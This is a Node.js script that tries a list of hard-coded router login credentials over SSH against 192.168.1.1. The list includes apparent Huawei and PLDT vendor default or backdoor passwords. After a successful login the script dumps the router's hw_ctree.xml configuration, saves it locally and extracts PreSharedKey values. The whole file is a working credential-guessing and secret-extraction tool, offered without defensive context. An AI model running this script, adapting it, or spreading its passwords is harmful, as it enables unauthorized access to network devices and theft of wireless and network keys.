const { Client } = require('ssh2');

const HOST = '192.168.1.1';
const PORT = 22;

// Try different credential combinations
const attempts = [
  { user: 'root', pass: 'adminHW' },
  { user: 'sUser', pass: 'EP!99R4HLH9E' },
  { user: 'sUser', pass: 'U3YELC4J#X39' },
  { user: 'root', pass: 'EP!99R4HLH9E' },
  { user: 'adminpldt', pass: 'AC2DIU7QW3ERTY6UPAS4DFG' },
];

async function tryConnect(creds) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let timedOut = false;

    const timer = setTimeout(() => {
      timedOut = true;
      conn.end();
      resolve({ success: false, error: 'timeout', output });
    }, 8000);

    conn.on('ready', () => {
      clearTimeout(timer);
      console.log(`Connected as ${creds.user}`);
      
      // Try to read config directly
      conn.exec('cat /mnt/jffs2/hw_ctree.xml 2>/dev/null; cat /flash/hw_ctree.xml 2>/dev/null; cat /var/hw_ctree.xml 2>/dev/null; echo CONFIG_END', (err, stream) => {
        if (err) {
          conn.end();
          resolve({ success: true, error: err.message, output });
          return;
        }
        stream.on('data', (data) => {
          output += data.toString();
        });
        stream.stderr.on('data', (data) => {
          output += data.toString();
        });
        stream.on('close', () => {
          conn.end();
          resolve({ success: true, output });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      if (!timedOut) {
        resolve({ success: false, error: err.message, output });
      }
    });

    conn.on('close', () => {
      clearTimeout(timer);
    });

    conn.connect({
      host: HOST,
      port: PORT,
      username: creds.user,
      password: creds.pass,
      readyTimeout: 5000,
      keepaliveInterval: 0,
    });
  });
}

(async () => {
  for (const creds of attempts) {
    console.log(`\nTrying ${creds.user}:${creds.pass}...`);
    const result = await tryConnect(creds);
    if (result.success) {
      console.log(`SUCCESS with ${creds.user}:${creds.pass}`);
      console.log('Output:', result.output.substring(0, 3000));
      if (result.output.includes('CONFIG_END')) {
        console.log('\n=== Found config output ===');
        const config = result.output.replace('CONFIG_END', '').trim();
        if (config.length > 0) {
          require('fs').writeFileSync('C:\\Users\\emili\\AppData\\Local\\Temp\\ssh_config.xml', config);
          console.log('Config saved, length:', config.length);
          // Search for PreSharedKey
          const pskMatch = config.match(/PreSharedKey[^<]+/g);
          if (pskMatch) console.log('PreSharedKey matches:', pskMatch);
        } else {
          console.log('No config content found');
        }
      }
      return;
    } else {
      console.log('Failed:', result.error);
    }
  }
  console.log('\nAll credential attempts failed');
})();
